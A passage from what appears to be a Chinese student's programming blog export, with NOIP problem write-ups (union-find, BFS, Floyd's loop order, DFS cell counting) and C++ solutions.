class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">30001</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        father[i]=i;</span><br><span class="line">        Num_end[i]=<span class="number">1</span>;</span><br><span class="line">        Num_Start[i]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s1&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="keyword">if</span>(s1==<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> x=Getfather(a);</span><br><span class="line">            <span class="keyword">int</span> y=Getfather(b);</span><br><span class="line">            father[y]=x;</span><br><span class="line">            Num_Start[y]=Num_end[x];</span><br><span class="line">            Num_end[x]=Num_end[x]+Num_end[y];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s1==<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> x=Getfather(a);</span><br><span class="line">            <span class="keyword">int</span> y=Getfather(b);</span><br><span class="line">            <span class="keyword">if</span>(x!=y) <span class="built_in">cout</span>&lt;&lt;<span class="number">-1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="built_in">abs</span>(Num_Start[a]-Num_Start[b])<span class="number">-1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="noip2010-关押罪犯"><a href="#noip2010-关押罪犯" class="headerlink" title="[noip2010]关押罪犯"></a>[noip2010]关押罪犯</h1><blockquote>
<p>刚刚做了这道题，感受到了并查集的超级神奇之处，所以特意总结下来</p>
</blockquote>
<h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>S 城现有两座监狱，一共关押着 N 名罪犯，编号分别为 1~N。他们之间的关系自然也极不和谐。很多罪犯之间甚至积怨已久，如果客观条件具备则随时可能爆发冲突。我们用“怨气值”（一个正整数值）来表示某两名罪犯之间的仇恨程度，怨气值越大，则这两名罪犯之间的积怨越多。如果两名怨气值为 c 的罪犯被关押在同一监狱，他们俩之间会发生摩擦，并 造成影响力为 c 的冲突事件。<br><br>每年年末，警察局会将本年内监狱中的所有冲突事件按影响力从大到小排成一个列表， 然后上报到 S 城 Z 市长那里。公务繁忙的 Z市长只会去看列表中的第一个事件的影响力，如果影响很坏，他就会考虑撤换警察局长。<br><br>在详细考察了 N 名罪犯间的矛盾关系后，警察局长觉得压力巨大。他准备将罪犯们在两座监狱内重新分配，以求产生的冲突事件影响力都较小，从而保住自己的乌纱帽。假设只要处于同一监狱内的某两个罪犯间有仇恨，那么他们一定会在每年的某个时候发生摩擦。那 么，应如何分配罪犯，才能使 Z 市长看到的那个冲突事件的影响力最小？这个最小值是多少？</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>输入文件名为 prison.in。输入文件的每行中两个数之间用一个空格隔开。 第一行为两个正整数 N 和 M，分别表示罪犯的数目以及存在仇恨的罪犯对数。 接下来的 M 行每行为三个正整数 aj，bj，cj，表示 aj 号和 bj 号罪犯之间存在仇恨，其怨气值为 cj。数据保证1 ≤ a j  &lt; b j  ≤ N ，0 &lt; c j  ≤ 1,000,000,000 ，且每对罪犯组合只出现一 次。</p>
</blockquote>
<h2 id="输出"><a href="#输出" class="headerlink" title="输出:"></a>输出:</h2><blockquote>
<p>输出文件 prison.out 共 1 行，为 Z 市长看到的那个冲突事件的影响力。如果本年内监狱 中未发生任何冲突事件，请输出 0。</p>
</blockquote>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这道题最开始是利用二分图匹配来写的，但是在网上看到了神奇的并查集的写法，真的是效率非常非常高！并且是超级好写，无论是相对于二分答案还是二分图匹配，代码量是非常小的。</p>
<p>那么我们可以建立两个集合，一个集合表示这这两个不在一个监狱里，另一个集合表示这两个人在一个监狱里面，那么我们就可以将所有的怒气值从大到小进行一个排序，然后进行枚举，查找他们所在的集合，然后判断是不是出现了冲突（在同一个集合里面），如果出现了冲突，那么这个值就是怒气值的最大值，直接输出就好，如果没有出现冲突，那么将这两个放在一个并查集（表示不在同一个监狱的并查集）里面，表示这两个人是在不同的监狱里面。然后继续循环。</p>
<p>其实这道题就是运用到了并查集的容斥原理，和一点小小的贪心，我们将尽量怒气值比较大的放在不同的监狱里面，然后放次大的，如果出现冲突，也就是说在前面的安排之下，没有办法将当前的两个人分开，那么这两个人只能在一个监狱里面，这也就是最小的怒气值。</p>
<p>算法真的是超级神奇啊！！！</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">&#125;a[<span class="number">120000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,f[<span class="number">120000</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mycmp</span><span class="params">( Edge a,Edge b)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> a.v&gt;b.v; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(f[x]==x) <span class="keyword">return</span> x;</span><br><span class="line">    f[x]=Find(f[x]);</span><br><span class="line">    <span class="keyword">return</span> f[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In(); m=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i].x=In();</span><br><span class="line">        a[i].y=In();</span><br><span class="line">        a[i].v=In();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n*<span class="number">2</span>;i++) f[i]=i;</span><br><span class="line">    sort(a+<span class="number">1</span>,a+m+<span class="number">1</span>,mycmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> xx=Find(a[i].x);</span><br><span class="line">        <span class="keyword">int</span> yy=Find(a[i].y);</span><br><span class="line">        <span class="keyword">if</span>(xx==yy)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;a[i].v&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        f[yy]=Find(a[i].x+n);</span><br><span class="line">        f[xx]=Find(a[i].y+n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="literal">false</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>总结</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title>SPFA/BFS+NOIP2009最佳贸易</title>
    <url>/2017/05/19/5f5e6231cd15/</url>
    <content><![CDATA[<h1 id="错误总结："><a href="#错误总结：" class="headerlink" title="错误总结："></a>错误总结：</h1><blockquote>
<p>好久没有这么爽的A一道题了，这个爽代表着无数次Debug和最后的恍然大悟，然后AC。很有成就感的说，比作数学题爽得多……</p>
</blockquote>
<p>首先总结一下最近写图论的时候犯的一些小错误：</p>
<p>1.更新a[i].point=a[i].point，说白了就是 j 打成 i ……</p>
<p>2.没有考虑到不去赋初值对程序的影响</p>
<p>3.数组名打错……比如Link1打成Link什么的……</p>
<p>4.两个链表运用的时候a，b搞混</p>
<p>5.没有小小的证明就开始乱搞，比如这道题</p>
<h1 id="NOIP2009最佳贸易"><a href="#NOIP2009最佳贸易" class="headerlink" title="NOIP2009最佳贸易"></a>NOIP2009最佳贸易</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>C 国有 n 个大城市和 m 条道路，每条道路连接这 n 个城市中的某两个城市。任意两个城市之间最多只有一条道路直接相连。这    m 条道路中有一部分为单向通行的道路，一部分为双向通行的道路，双向通行的道路在统计条数时也计为 1 条。<br><br>C 国幅员辽阔，各地的资源分布情况各不相同，这就导致了同一种商品在不同城市的价格不一定相同。但是，同一种商品在同一个城市的买入价和卖出价始终是相同的。商人century来到    C 国旅游。当他从strork处得知同一种商品在不同城市的价格可能会不同这一信息<br><br>之后，便决定在旅游的同时，利用商品在不同城市中的差价赚回一点旅费。设 C 国 n 个城市的标号从 1~ n，century决定从 1 号城市出发，并最终在 n 号城市结束自己的旅行。在旅游的过程中，任何城市可以重复经过多次，但不要求经过所有 n 个城市。century通过这样的贸易方式赚取旅费：他会选择一个经过的城市买入他最喜欢的商品——AWP，并在之后经过的另一个城市卖出这个AWP，用赚取的差价当做旅费。由于century主要是来C国旅游，他决定这个贸易只进行最多一次，当然，在赚不到差价的情况下他就无需进行贸易。<br><br>假设 C 国有 5 个大城市，城市的编号和道路连接情况如下图，单向箭头表示这条道路为单向通行，双向箭头表示这条道路为双向通行。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行包含 2 个正整数 n 和 m，中间用一个空格隔开，分别表示城市的数目和道路的数目。<br><br>第二行 n 个正整数，每两个整数之间用一个空格隔开，按标号顺序分别表示这 n 个城市的商品价格。<br><br>接下来 m 行，每行有 3 个正整数，x，y，z，每两个整数之间用一个空格隔开。如果 z=1，<br>表示这条道路是城市 x 到城市 y 之间的单向道路；如果 z=2，表示这条道路为城市 x 和城市y 之间的双向道路。</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出共 1 行，包含 1 个整数，表示最多能赚取的旅费。如果没有进行贸易，<br>则输出 0。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题的思路就是首先绕着这张图跑一便，首先要保证你买水晶球的点是可以从1号城市到达的，其次是保证你能买了水晶球能够到n号城市，卖水晶球也是同样的道理……所以说，你需要找到所有能从1号城市到达且能回到n号城市，这样的点可以被作为买卖点。</p>
<p>然后用一个一维数组，存下 <code>The_max[i]</code> 和 <code>The_min[i]</code> ，分别表示在i点之前能买到最便宜的水晶球 <code>The_min[i]</code> 和在i点之后能卖出的最贵水晶球 <code>The_max[i]</code> 。最后 <code>The_max[i]-The_min[i]</code> 就可以找到在i点之前购买，在i点之后卖出可以获得的最大利润。</p>
<p>开始我是用SPFA写的，但是后来超时，原因就可能是找最大解的时候一个二重循环，且现在想想那个二重循环还是不可靠的，毕竟连买入点和卖出点都不知道在不在一条路上就算答案，RP爆发的是A掉了一半的分数，剩下不是WA就是TLE。</p>
<p>后来听同学的话，重新写了一遍，使用BFS来遍历每一个城市，能够满足的标上true，最后在计算答案。比较麻烦的其实就是 <code>The_max[i]</code> 和 <code>The_min[i]</code> 的处理上，这两个处理是根据自己上一个节点来处理的，如果上一个节的 <code>The_max[i]</code> 和 <code>The_min[i]</code> 比自己的小/大，那么就更新自己 <code>The_max[i]</code> 和 <code>The_min[i]</code> ，否则就将上一个节点的 <code>The_max[i]   </code> 和 <code>The_min[i]</code> 更新自己。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> point;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line">Edge a[<span class="number">1000001</span>],b[<span class="number">1000001</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,x,y,z,ans=<span class="number">0</span>,Prize[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">int</span> Link1[<span class="number">100001</span>],Link2[<span class="number">100001</span>],List[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">int</span> The_max[<span class="number">100001</span>],The_min[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">bool</span> Ask[<span class="number">100001</span>],First[<span class="number">100001</span>],Last[<span class="number">100001</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS_First</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Ask,<span class="literal">true</span>,<span class="keyword">sizeof</span>(Ask));</span><br><span class="line">    <span class="keyword">int</span> tail=<span class="number">1</span>;</span><br><span class="line">    List[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    Ask[List[<span class="number">1</span>]]=<span class="literal">false</span>;</span><br><span class="line">    First[List[<span class="number">1</span>]]=<span class="literal">true</span>;</span><br><span class="line">    The_min[List[<span class="number">1</span>]]=Prize[List[<span class="number">1</span>]];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tail;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=Link1[List[i]];j!=<span class="number">0</span>;j=a[j].next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(Prize[a[j].point]&lt;The_min[List[i]])</span><br><span class="line">            The_min[a[j].point]=Prize[a[j].point];</span><br><span class="line">            <span class="keyword">else</span> The_min[a[j].point]=The_min[List[i]];</span><br><span class="line">            <span class="keyword">if</span>(Ask[a[j].point]==<span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Ask[a[j].point]=<span class="literal">false</span>;</span><br><span class="line">                First[a[j].point]=<span class="literal">true</span>;</span><br><span class="line">                List[++tail]=a[j].point;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS_Last</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Ask,<span class="literal">true</span>,<span class="keyword">sizeof</span>(Ask));</span><br><span class="line">    <span class="keyword">int</span> tail=<span class="number">1</span>;</span><br><span class="line">    List[<span class="number">1</span>]=n;</span><br><span class="line">    Ask[List[<span class="number">1</span>]]=<span class="literal">false</span>;</span><br><span class="line">    Last[List[<span class="number">1</span>]]=<span class="literal">true</span>;</span><br><span class="line">    The_max[List[<span class="number">1</span>]]=Prize[List[<span class="number">1</span>]];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tail;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=Link2[List[i]];j!=<span class="number">0</span>;j=b[j].next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(Prize[b[j].point]&gt;The_max[List[i]])</span><br><span class="line">            The_max[b[j].point]=Prize[b[j].point];</span><br><span class="line">            <span class="keyword">else</span> The_max[b[j].point]=The_max[List[i]];</span><br><span class="line">            <span class="keyword">if</span>(Ask[b[j].point]==<span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Ask[b[j].point]=<span class="literal">false</span>;</span><br><span class="line">                Last[b[j].point]=<span class="literal">true</span>;</span><br><span class="line">                List[++tail]=b[j].point;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">memset</span>(Link1,<span class="number">0</span>,<span class="keyword">sizeof</span>(Link1));</span><br><span class="line">    <span class="built_in">memset</span>(Link2,<span class="number">0</span>,<span class="keyword">sizeof</span>(Link2));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;Prize[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y&gt;&gt;z;</span><br><span class="line">        a[++ans].point=y;</span><br><span class="line">        a[ans].next=Link1[x];</span><br><span class="line">        Link1[x]=ans;</span><br><span class="line">        b[ans].point=x;</span><br><span class="line">        b[ans].next=Link2[y];</span><br><span class="line">        Link2[y]=ans;</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a[++ans].point=x;</span><br><span class="line">            a[ans].next=Link1[y];</span><br><span class="line">            Link1[y]=ans;</span><br><span class="line">            b[ans].point=y;</span><br><span class="line">            b[ans].next=Link2[x];</span><br><span class="line">            Link2[x]=ans;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    BFS_First();</span><br><span class="line">    BFS_Last();</span><br><span class="line">    ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(First[i]==<span class="literal">true</span>&amp;&amp;Last[i]==<span class="literal">true</span>)</span><br><span class="line">    ans=max(ans,The_max[i]-The_min[i]);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>BFS</tag>
        <tag>SPFA</tag>
        <tag>NOIP</tag>
      </tags>
  </entry>
  <entry>
    <title>规划一下List</title>
    <url>/2017/05/19/ad7784ca9c16/</url>
    <content><![CDATA[<h1 id="具体规划"><a href="#具体规划" class="headerlink" title="具体规划"></a>具体规划</h1><p><del>1.学会Floyd算法</del></p>
<p><del>2.学会Dijkstra算法</del></p>
<p><del>3.学会Bellman-ford算法</del></p>
<p><del>4.学会SPFA算法</del></p>
<p><del>5.学会最小生成树Prim算法</del></p>
<p><del>6.同样的最小生成树Kruskal算法</del></p>
<p><del>7.学会拓扑排序Topsort算法</del></p>
<p><del>8.割点、割边与强连通分量</del></p>
<p><del>9.学会Hash-哈希表的应用（跪求刘神快点给我们讲！！）</del></p>
<p><del>10.学会并查集查找</del></p>
<h1 id="感言"><a href="#感言" class="headerlink" title="感言"></a>感言</h1><p>赶完一个就划掉一个，我已经发现在图论里面，我是机房同等级最慢的一个。其实很大原因就是寒假偷懒了，要抓紧补回来。</p>
<p>文化课，一天六七节课都翘掉是不能了，每天规定时间：副课、下午最后一节自习、晚自习、中午可以来机房，剩下的时间都要在班里面，一定要把学习指导和活页完成，其次是英语，每天要背单词了，一定要背，绝对的！</p>
<blockquote>
<p>加油吧！！！</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>Floyed的k循环在最外层详解</title>
    <url>/2017/05/19/6bb8f8495a00/</url>
    <content><![CDATA[<h1 id="Flyed算法"><a href="#Flyed算法" class="headerlink" title="Flyed算法"></a>Flyed算法</h1><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">1</span>;k&lt;=n;k++)</span><br><span class="line"> <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">     <span class="keyword">if</span>(e[i][j]&gt;e[i][k]+e[k][j])</span><br><span class="line">   e[i][j]=e[i][k]+e[k][j];</span><br></pre></td></tr></table></figure>
<h2 id="代码讲解："><a href="#代码讲解：" class="headerlink" title="代码讲解："></a>代码讲解：</h2><p>这段代码的基本思想就是：最开始只允许经过1号顶点进行中转，接下来只允许经过1和2号顶点进行中转……允许经过1~n号所有顶点进行中转，求任意两点之间的最短路程。用一句话概括就是：从i号顶点到j号顶点只经过前k号点的最短路程。</p>
<h2 id="K循环作用"><a href="#K循环作用" class="headerlink" title="K循环作用"></a>K循环作用</h2><p>也就是说，最外层的循环每次枚举的是中间点k，然后下面两个循环不停地枚举通过另外两个点，如果这两个点能够通过k这个点更新掉 i 到 j 的最短路，那么就开始更新，其实我在最开始接触Floyd的时候，有一点很是不理解，那就是为什么k在最外层循环，因为k代表的是 i 和 j 中间的点，为什么k不能在第二层循环或者是第三层循环呢，找了很久的资料之后我才弄明白这个算法中k为什么在最外层，顺便感悟到了这个算法的真正的魅力和神奇。</p>
<h2 id="代码运行"><a href="#代码运行" class="headerlink" title="代码运行"></a>代码运行</h2><p>开始算法之前，首先介绍一下这个算法是如何运行的，e[i][j]指的是从 i 到 j 的最短路，在初始化的时候，如果着两条边直接有路相连，那么直接赋值，如果没有连接，那么就设为正无穷大，一般用一个比较大的数。然后每次比较 i 和 j 之间的中间点 k ，如果 i 到k 加上 k 到 j 的权值小于 i 直接到 j 那么 e[i][j]的值也就是 i 到 j 的最短路就变成了从e[i][k]+e[k][j]的值。</p>
<h2 id="K循环最外层证明"><a href="#K循环最外层证明" class="headerlink" title="K循环最外层证明"></a>K循环最外层证明</h2><p>但是为什么要先枚举k呢，为什么不能先枚举 i 然后再枚举 i 的中间点k，最后枚举 j 呢，其实这是因为，i=1,j=2时，这时k分别取1,2,…,n，这时1到3，1到4，…..，3到2，4到2，…的距离都不是某种意义上最短的，而这个新算法却直接使用了他们，并且再也没有回头重新计算i到j的距离是否因为其他节点间距离的改变而更短，所以这样算出来的值也就没有什么意义。</p>
<h2 id="K循环最外层证明实例"><a href="#K循环最外层证明实例" class="headerlink" title="K循环最外层证明实例"></a>K循环最外层证明实例</h2><blockquote>
<p>如果用比较清晰的图来说明的话，如下图：</p>
</blockquote>
<p><img src="https://xorex.space/image/013.png"></p>
<p>在上面这个图中枚举i=A，j=B，然后循环，正确的A到B最小是3，然而你更新的是125，因为你在枚举下一个i之后，就不会再次回去了，所以说A,B之间的最短路就被定为了125，以后也会以e[i][j]=125去更新其他的点，所以说，k循环必须放在最外层，不然会有可能无法找到最优值。</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>Floyed</tag>
      </tags>
  </entry>
  <entry>
    <title>DFS&amp;BFS初步理解+P1167细胞问题</title>
    <url>/2017/05/19/bd911b6aa105/</url>
    <content><![CDATA[<h1 id="DFS和BFS定义"><a href="#DFS和BFS定义" class="headerlink" title="DFS和BFS定义"></a>DFS和BFS定义</h1><h2 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h2><p>关于DFS，他叫做深度优先搜索，简称DFS，就是一条道走到黑，只要这里能够搜索，那么就不停地往下搜，往下搜，一直搜到不能搜为止，然后不能搜了直接返回上一层，然后继续搜，一直搜到不能搜为止。但是书上一直说DFS如果地图类型数据量很大的话会系统堆栈溢出……</p>
<h2 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h2><p>关于BFS，他叫做广度优先搜索，简称BFS，就是一走走一圈，走完一圈走下一圈，是一层一层的走，如果DFS是一个知识点刨根问底型学习的话，BFS就是分区规划型学习，两种算法在不同的题目虽然都可以用到，但是效率却相差甚远,所以要去学习怎么搞算法……</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>一矩形阵列由数字0到9组成,数字1到9代表细胞,细胞的定义为沿细胞数字上下左右还是细胞数字则为同一细胞,求给定矩形阵列的细胞个数</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>整数0&lt;=m,n&lt;=100(m行，n列)<br><br>M行n列0到9的数字（中间没有空格）</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>细胞的个数</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题就需要搜索了，首先枚举点，找到一个细胞的一部分就开始染色，用BFS或者DFS染成0，这样就不会干扰到寻找其他细胞了！然后一旦找到细胞的一部分就把这个细胞染成0色，这样找到一个一部分就找到了一个细胞，ans++就好了！</p>
<p>DFS染色：就是找到一个部分就向四周扩散，发现一个方向是细胞本身，扩散找到的细胞本身……</p>
<h3 id="DFS代码："><a href="#DFS代码：" class="headerlink" title="DFS代码："></a>DFS代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x1=x+dx[i];</span><br><span class="line">        <span class="keyword">int</span> y1=y+dy[i];</span><br><span class="line">        <span class="keyword">if</span>(a[x1][y1]!=<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a[x1][y1]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            dfs(x1,y1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
